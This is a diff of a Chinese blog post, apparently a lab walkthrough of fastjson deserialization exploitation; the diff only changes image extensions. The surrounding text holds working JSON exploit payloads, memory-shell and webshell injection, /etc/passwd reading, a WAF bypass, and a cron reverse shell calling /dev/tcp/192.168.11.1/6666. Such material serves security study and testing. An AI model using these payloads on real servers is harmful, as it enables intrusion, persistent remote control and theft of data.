 <p>使用<code>JNDIExploit</code> 工具继续进行<code>Payload</code>的测试，可以在这个靶场中使用<code>/Basic/TomcatEcho</code>或<code>TomcatBypass/TomcatEcho</code>载荷执行命令回显:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240514152341695.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240514152341695.webp"></p>
 <p>使用<code>/*/TomcatMemshell3</code>、<code>/*/GodzillaMemshell</code>注入冰蝎3或哥斯拉的内存马:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240514164108948.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240514164108948.webp"></p>
 <h3 id="4-2-fastjson-1-2-45-jdk8u342"><a href="#4-2-fastjson-1-2-45-jdk8u342" class="headerlink" title="4.2 fastjson-1.2.45-jdk8u342"></a>4.2 fastjson-1.2.45-jdk8u342</h3><p>使用<a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty/blob/main/1245-jdk8u342">FastJsonParty/1245-jdk8u342</a>进行环境搭建，需要绕过<code>JDK</code>高版本限制进行<code>JNDI</code>注入利用。主要可以利用<code>fastjson</code>原生反序列化链,通过原生反序列化漏洞执行字节码，实现内存马等功能。环境搭建完成后，可以访问<code>/tologin</code>进入登录页面抓包，账户和密码通过<code>JSON</code>格式进行传输:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240525153905537.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240525153905537.webp"></p>
 <p>通过报错信息获取版本信息:</p>
 <pre><code class="line-numbers language-json">{"@type": "java.lang.AutoCloseable"
 </code></pre>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240525155443715.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240525155443715.webp"></p>
 <p>寻找高版本下可进行利用的类，首先可以利用类转换异常报错探测环境信息。当类不存在时，没有异常信息:</p>
 <pre><code class="line-numbers language-json">{"x": {"@type": "java.lang.Character"{"@type": "java.lang.Class","val": "javax.el.ELProcessor"}}
 </code></pre>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240525172306575.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240525172306575.webp"></p>
 <p>当探测到存在可利用的类时，抛出异常:</p>
 <pre><code class="line-numbers language-json">{"x": {"@type": "java.lang.Character"{"@type": "java.lang.Class","val": "org.apache.catalina.users.MemoryUserDatabaseFactory"}}
 </code></pre>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240525172330904.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240525172330904.webp"></p>
 <p>所以这个环境中还可以尝试<code>org.apache.catalina.UserDatabase</code>和<code>org.apache.catalina.users.MemoryUserDatabaseFactory</code>的写文件利用方式。这里就直接使用<code>fastjson</code>原生反序列化利用链，通过<code>java -jar JNDIBypass.jar -a 0.0.0.0 -p 1388 -ms behinder_shell</code>启动<code>ldap</code>服务，然后使用1.2.47的<code>POC</code>:</p>
 <pre><code class="line-numbers language-json">{"1": {"@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl"}, "2": {"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://x:1388/J13Rf", "autoCommit": true}}
 </code></pre>
 <p>执行后服务端返回了<code>set property error, autoCommit</code>错误，但内存马已经成功注入：</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240525174424034.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240525174424034.webp"></p>
 <h3 id="4-3-fastjson-1-2-47-dbcp-bcel"><a href="#4-3-fastjson-1-2-47-dbcp-bcel" class="headerlink" title="4.3 fastjson-1.2.47-dbcp-bcel"></a>4.3 fastjson-1.2.47-dbcp-bcel</h3><p><a target="_blank" rel="noopener" href="https://github.com/depycode/fastjson-local-echo">fastjson-local-echo</a>是一个在<code>fastjson1.2.47</code>和<code>tomcat-dbcp</code>依赖环境中进行命令执行回显测试的环境，可根据需要调整具体版本，适用的依赖环境和当前配置的依赖版本如下:</p>
 <ul>
 <li>fastjson &lt;= 1.2.24、1.2.33 &lt;= fastjson &lt;= 1.2.47</li>
 <li>jdk &lt; 8u251</li>
 <li>存在tomcat-dbcp依赖</li>
 </ul>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240515163441279.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240515163441279.webp"></p>
 <p>可以通过该项目测试基于<code>tomcat-dbcp</code>的<code>fastjson rce</code>回显，使用<code>Maven</code>的<code>package</code>命令将项目打包成<code>jar</code>包:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240515163748287.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240515163748287.webp"></p>
 <p>然后使用<code>jdk8u241</code>版本启动<code>jar</code>包:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240515163838745.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240515163838745.webp"></p>
 <p>如果是更高版本(JDK8u251)时，使用<code>DBCP+BCEL</code>利用方式时会抛出异常:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240515163925461.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240515163925461.webp"></p>
 <p><code>fastjson-local-echo</code>提供了<code>POC</code>和回显利用的代码。使用<code>jdk8u241</code>的<code>javac</code>将<code>SpringEcho.java</code>编译为<code>.class</code>文件，然后需要将其转换为<code>bcel</code>字节码编码格式，项目自带的<code>BCELEncode.java</code>似乎存在点问题没能输出完整的字符串，这里通过<a target="_blank" rel="noopener" href="https://github.com/flamingo-gx/Fastjson-BCELCoder/">Fastjson-BCELCoder</a>项目转换下即可:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240515175829345.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240515175829345.webp"></p>
 <p>然后就可以通过<code>bcel</code>和<code>SpringEcho</code>载荷进行命令执行回显了，使用<code>fastjson1.2.47</code>的POC:</p>
 <pre><code class="line-numbers language-json">{
     "xx":
@@ -2794,20 +2794,20 @@ https://b1ngz.github.io/java-os-command-injection-note/
     }
 }
 </code></pre>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240515183847518.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240515183847518.webp"></p>
 <p>使用<code>JMG</code>生成冰蝎内存马:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240711110011633.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240711110011633.webp"></p>
 <p>注入并连接成功:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240711110124343.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240711110124343.webp"></p>
 <h3 id="4-4-fastjson-1-2-47-c3p0"><a href="#4-4-fastjson-1-2-47-c3p0" class="headerlink" title="4.4 fastjson-1.2.47-c3p0"></a>4.4 fastjson-1.2.47-c3p0</h3><p><a target="_blank" rel="noopener" href="https://github.com/depycode/fastjson-c3p0">fastjson-c3p0</a>项目是一个使用<code>fastjson1.2.47</code>和<code>c3p0</code>依赖进行不出网回显利用的测试环境:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516182325949.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516182325949.webp"></p>
 <p>对于<code>c3p0</code>的二次反序列化利用，首先通过<code>com.mchange.v2.c3p0.WrapperConnectionPoolDataSource</code>类的<code>ReadObject()</code>触发第一次反序列化，然后利用其他本地反序列化链执行字节码，实现命令回显等功能。将项目通过<code>IDEA </code>打包成<code>JAR</code>包后启动，项目中使用了<code>commons-collections 3.1</code>依赖，所以可以使用项目中自带的<code>CC8</code>利用链(可以使用<code>ysoserial</code>工具生成)进行命令执行回显测试:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516190221667.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516190221667.webp"></p>
 <p>在上文<code>fastjson-1.2.45-jdk8u342</code>测试环境中我们针对高版本的<code>JDK</code>环境使用了<code>fastjson</code>原生反序列化利用链，那么同样也可以针对该环境写入内存马。在<code>fastjson-1.2.45-jdk8u342</code>环境中，是通过<code>JNDI</code>触发的反序列化漏洞，该环境的利用需要进行二次反序列化，所以需要拿到<code>JNDI</code>返回的反序列化载荷，然后通过<code>c3p0</code>的反序列化漏洞执行后续利用链。</p>
 <p>第一步通过<code>JADX</code>反编译<code>JNDIBypass.jar</code>工具，可以找到<code>Base64</code>编码后的内存马载荷:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516190732124.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516190732124.webp"></p>
 <p>内存马访问地址和密码:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516191519814.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516191519814.webp"></p>
 <p>第二步需要将载荷转换为<code>c3p0</code>需要的十六进制数据，编写处理代码如下:</p>
 <pre><code class="line-numbers language-JAAV">import java.util.Base64;
 public class Test {
@@ -2832,28 +2832,28 @@ String behinder_shell = "rO0ABXNyABFqYXZhLn...";
 }
 </code></pre>
 <p>执行代码后就可以得到十六进制数据了:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516191027438.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516191027438.webp"></p>
 <p>将得到的数据填入POC对应位置（注意HEX数据末尾需要多一位，在<code>c3p0</code>代码中会移除最后一位）:</p>
 <pre><code class="line-numbers language-JSOn">{"e":{"@type":"java.lang.Class","val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"},"f":{"@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:ACE...7878;"}}
 </code></pre>
 <p>现在就可以尝试写入内存马了，发送载荷之前访问下内存马地址<code>/behinder</code>，返回404:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516191406209.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516191406209.webp"></p>
 <p>然后发送载荷，返回了500:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516191329290.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516191329290.webp"></p>
 <p>此时内存马地址返回200，使用冰蝎v3连接成功:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516191702203.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516191702203.webp"></p>
 <h3 id="4-5-fastjson-1-2-68-jdbc"><a href="#4-5-fastjson-1-2-68-jdbc" class="headerlink" title="4.5 fastjson-1.2.68-jdbc"></a>4.5 fastjson-1.2.68-jdbc</h3><p>通过<a target="_blank" rel="noopener" href="https://github.com/safe6Sec/ShiroAndFastJson">safe6Sec/ShiroAndFastJson</a>项目编译为<code>jar</code>包搭建测试环境，在项目中添加了常用的依赖并且预设了<code>payload</code>：</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240527182006316.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240527182006316.webp"></p>
 <p>可以很方便的根据当前配置的测试环境在这个目录下来筛选可利用<code>payload</code>。</p>
 <p>当前搭建的环境是在可出网的环境下使用<code>jar</code>包形式在<code>fastjson1.2.68</code>及<code>JDK8u251</code>环境中运行，没有<code>WEB</code>目录可以读文件或写<code>webshell</code>。根据上文介绍的内容，可以尝试下<code>JDBC</code>反序列化进行<code>RCE</code>。这里还是通过黑盒测试的方式来进行，先通过响应信息是否报错判断大致版本:</p>
 <pre><code class="line-numbers language-json">// 不报错:1.2.24-1.2.68
 {"zero":{"@type":"java.lang.AutoCloseable","@type":"java.io.ByteArrayOutputStream"}}
 </code></pre>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240527153342118.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240527153342118.webp"></p>
 <pre><code class="line-numbers language-json">// 报错: 1.2.48-1.2.83
 {"a": {"@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl"}, "b": {"@type": "com.sun.rowset.JdbcRowSetImpl"}}
 </code></pre>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240527153418561.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240527153418561.webp"></p>
 <p>得到版本范围在<code>1.2.48-1.2.68</code>之间，那么就可以使用1.2.68版本的<code>POC</code>。先利用报错<code>Payload</code>探测下<code>MySQL</code>依赖版本:</p>
 <pre><code class="line-numbers language-JSON">/*
 com.mysql.jdbc.Buffer  // mysql-jdbc-5
@@ -2871,13 +2871,13 @@ org.springframework.web.bind.annotation.RequestMapping // SpringBoot回显
 }
 </code></pre>
 <p>使用<code>mysql-connect-8</code>类时发现返回错误，说明存在<code>mysql-connect-8</code>依赖（只有8.0.19这个版本可以反序列化利用）:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240528223727643.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240528223727643.webp"></p>
 <p>在项目中搜索当前版本的<code>payload</code>，<code>repo:safe6Sec/ShiroAndFastJson path:/^src\/main\/java\/com\/shiro\/vuln\/fastjson\// 1.2.68</code>：</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240528224016388.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240528224016388.webp"></p>
 <p>所以还需要一个模拟<code>MySQL</code>服务器的工具<a target="_blank" rel="noopener" href="https://github.com/fnmsd/MySQL_Fake_Server">MySQL_Fake_Server</a>。<code>MySQL_Fake_Server</code>建议在<code>Python3.7</code>下使用避免兼容问题，<code>MySQL_Fake_Server</code>的载荷行为通过<code>JDBC</code>连接信息中的<code>user</code>字段指定，可以通过配置文件进行预设，这部分项目中有详细介绍。先使用<code>MySQL_Fake_Server</code>读取下目标环境文件:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529134730335.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529134730335.webp"></p>
 <p>文件读取成功，但是目标<code>WEB</code>服务发起了很多次请求，导致写入了很多次文件:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529135000223.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529135000223.webp"></p>
 <p>继续执行反序列化的利用，在<code>MySQL_Fake_Server</code>中需要用到<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial</a>工具生成反序列化的载荷，在fastjson的利用中通过<code>host</code>指定远程<code>MySQL</code>服务器，<code>user</code>参数标记要使用的反序列化载荷，如这里的<code>CC4</code>利用链执行命令<code>yso_CommonsCollections4_calc</code>:</p>
 <pre><code class="line-numbers language-json">Content-Type: application/json; charset=UTF-8
 
@@ -2905,7 +2905,7 @@ org.springframework.web.bind.annotation.RequestMapping // SpringBoot回显
 }
 </code></pre>
 <p>实际利用中仅执行命令满足不了需求，需要使用增强的<a target="_blank" rel="noopener" href="https://github.com/Y4er/ysoserial">ysoserial</a>工具来实现内存马等功能:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240528231740068.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240528231740068.webp"></p>
 <p>可以查看该工具的使用方法:</p>
 <pre><code class="line-numbers language-cmd">// 原始执行命令版本
 java -jar ysoserial.jar CommonsBeanutils192NOCC "calc" 
@@ -2913,33 +2913,33 @@ java -jar ysoserial.jar CommonsBeanutils192NOCC "calc"
 java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatListenerMemShellFromThread"  # TomcatListenerMemShellFromThread
 </code></pre>
 <p>掌握了使用方法，接下来就需要修改下<code>MySQL_Fake_Server</code>的配置文件，使用<code>MemShell</code>用户名时便通过<code>ysoserial</code>返回内存马的利用载荷（<code>CommonsCollections4 CLASS:TomcatListenerMemShellFromThread</code>）:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240528232121758.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240528232121758.webp"></p>
 <p>另外在这个<code>ysoserial</code>工具中也有<code>fastjson</code>的原生反序列化利用链，同样可以实现内存马的注入:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529135652639.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529135652639.webp"></p>
 <p>修改完配置后重新启动<code>MySQL_Fake_Server</code>，然后发送<code>payload</code>：</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240528233733859.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240528233733859.webp"></p>
 <p><code>WEB</code>服务器和<code>MySQL_Fake_Server</code>显示如下:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240528233704493.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240528233704493.webp"></p>
 <p>然后就可以使用内存马了。内存马的使用方式还需要阅读下修改版本<code>ysoserial</code>内存马源码<a target="_blank" rel="noopener" href="https://github.com/Y4er/ysoserial/blob/main/src/main/java/ysoserial/payloads/templates/TomcatListenerMemShellFromThread.java">TomcatListenerMemShellFromThread.java</a>，先尝试下命令执行内存马:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240528233934608.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240528233934608.webp"></p>
 <p>根据代码逻辑需要添加请求头，进行命令执行并回显:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240528234126423.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240528234126423.webp"></p>
 <p>内存马同样添加自定义的请求头即可:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529002202172.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529002202172.webp"></p>
 <h3 id="4-6-fastjson-1-2-68-writefile"><a href="#4-6-fastjson-1-2-68-writefile" class="headerlink" title="4.6 fastjson-1.2.68-writefile"></a>4.6 fastjson-1.2.68-writefile</h3><p><a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty">FastJsonParty</a>项目中有对<code>fastjson1.2.68</code>文件读写利用方式的环境和详细<a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty/blob/main/FastJson1268%E5%86%99%E6%96%87%E4%BB%B6RCE%E6%8E%A2%E7%A9%B6.md">write-up</a>进行参考。这部分就来实际复现下<code>write-up</code>中写<code>webshell</code>、写计划任务、覆盖<code>charsets.jar</code>、写<code>Class</code>类几种通过写文件获取<code>RCE</code>的方式。</p>
 <p><strong>写WEBSHELL</strong></p>
 <p>写<code>webshell</code>的利用方式需要目标环境可解析<code>JSP</code>，使用<a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty/tree/main/1268-writefile-jsp">1268-writefile-jsp</a>环境进行测试。通过报错方式获取<code>fastjson</code>版本为1.2.68，并且可以得知是<code>tomcat8.5.95</code>:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529153627079.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529153627079.webp"></p>
 <p>探测下写文件依赖<code>org.apache.commons.io.Charsets</code>（2.6-）或<code>org.apache.commons.io.file.Counters</code>（2.7+）是否存在:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529160914835.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529160914835.webp"></p>
 <p>那么可以利用<code>commons-io-2.6</code>及以下Poc读写文件，先尝试读取<code>/etc/passwd</code>，通过返回错误内容判断是否成功读取文件，文件内容开头不是<code>root</code>时，返回<code>not close json text</code>:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529162105922.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529162105922.webp"></p>
 <p>文件内容开头为<code>root</code>时，返回<code> set property error</code>:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529162001072.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529162001072.webp"></p>
 <p>说明可以成功读取文件。接下来就需要探测<code>WEB</code>绝对路径，需要通过<code>file://</code>协议列出目录进行字节码对比，根据目标情况逐步探测目录，简单修改<a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty/blob/main/1268-writefile-jsp/readfile.py">readfile.py</a>进行目录枚举（<code>file</code>协议也可以替换为<code>netdoc</code>协议）:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529182705579.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529182705579.webp"></p>
 <p>一直枚举目录直到找到<code>web</code>目录</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529180447493.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529180447493.webp"></p>
 <p>写入的内容需要大于<code>8192</code>字符，尝试写入冰蝎<code>webshell</code>:</p>
 <pre><code class="line-numbers language-json">{
   "x":{
@@ -3022,7 +3022,7 @@ java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatListenerMemShellFro
 }
 </code></pre>
 <p>写入并连接成功:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529191328624.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529191328624.webp"></p>
 <p><strong>写计划任务</strong></p>
 <p>写<code>Linux</code>下计划任务时需要<code>root</code>权限，可以将文件写入到<code>/etc/cron.d</code>文件夹下。参考格式:</p>
 <pre><code class="line-numbers language-tex">\n\nSHELL=/bin/bash\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.11.1/6666 0&gt;&amp;1\n\n#aaaaa
@@ -3064,9 +3064,9 @@ RUN chmod +x /var/app/start.sh
 CMD ["/var/app/start.sh"]
 </code></pre>
 <p>使用<code>docker build -t centos-jdk8 . </code>命令构建镜像后启动容器: <code>docker run -d --name 1268writefile -p 18080:80 centos-jdk8</code>。还是通过报错方式探测版本和依赖，这个环境里存在<code>WAF</code>，可以将<code>@type</code>编码为<code>"\x40\u0074\u0079\u0070\u0065</code>进行绕过：</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240531154117377.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240531154117377.webp"></p>
 <p>不存在<code>org.apache.commons.io.file.Counters</code>和<code>org.apache.commons.io.Charsets</code>，考虑试试依赖<code>JDK</code>的<code>Payload</code>，编写一个<code>crontab</code>文件进行反弹<code>SHELL</code>：</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240531171420489.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240531171420489.webp"></p>
 <p>通过<code>Python</code>脚本编码为<code>Base64</code>：</p>
 <pre><code class="line-numbers language-python"># 将文件压缩后转为base64
 import zlib
@@ -3111,35 +3111,35 @@ print(compressed_base64_str)
     'protocolVersion':1
 }
 </code></pre>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240531171854036.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240531171854036.webp"></p>
 <p><strong>覆盖charsets.jar</strong></p>
 <p>继续使用写计划任务这个环境来实现覆盖<code>charsets.jar</code>注入内存马。首先需要制作用来执行注入内存马的<code>charsets.jar</code>。</p>
 <p><em>1.charsets.jar路径遍历</em></p>
 <p>这个环境没有配置<code>commons.io</code>依赖，并不能通过枚举目录的方式获得完整路径，只能尝试所有可能的路径写入，写入失败时会抛出异常，所以可以先尝试写入测试文件:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604021151472.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604021151472.webp"></p>
 <p>测试环境可以通过以下命令查看一下:</p>
 <pre><code class="line-numbers language-cmd">ls -lrt /etc/alternatives/java
 </code></pre>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604013018672.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604013018672.webp"></p>
 <p>在项目<a target="_blank" rel="noopener" href="https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks">spring-boot-upload-file-lead-to-rce-tricks</a>中存在一个常见依赖的路径字典，因为可以通过依赖检测确定是<code>JDK8</code>，与上面实际的路径对比就会发现，只需要暴力破解其中的版本号<code>1.8.0.282.b08</code>中的<code>282.b08</code>即可:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604021311551.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604021311551.webp"></p>
